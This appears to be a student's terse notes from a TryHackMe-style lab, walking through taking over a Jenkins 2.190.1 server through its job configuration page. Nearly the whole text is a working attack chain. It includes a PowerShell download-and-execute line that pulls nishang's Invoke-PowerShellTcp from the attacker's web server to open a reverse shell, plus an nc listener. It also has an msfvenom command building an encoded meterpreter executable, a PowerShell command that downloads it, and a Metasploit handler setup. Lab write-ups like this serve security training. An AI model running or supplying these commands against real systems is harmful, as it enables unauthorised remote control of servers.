jenkins version = 2.190.1

found area to inject code: http://10.10.60.11:8080/job/project/configure

hosted the "powershelltcp.ps1" scipt from nishang on a python webserver

set up a reverse listener "nc -lvnp 4444"

then used this command in the jenkins code window:
	powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port

gained access

then upgraded the shell to a metepreter shel
 - created an encoded x86-64 payoad to get a reverse shell 
	- msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
 - after creation, put this commamnd into the jenkins command area:
	- powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
 - then set the meterpreter handler up:
	- use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run
 - then executed the command on the target system inside jenkins "build now" button
 - in other created shell run the .exe payload

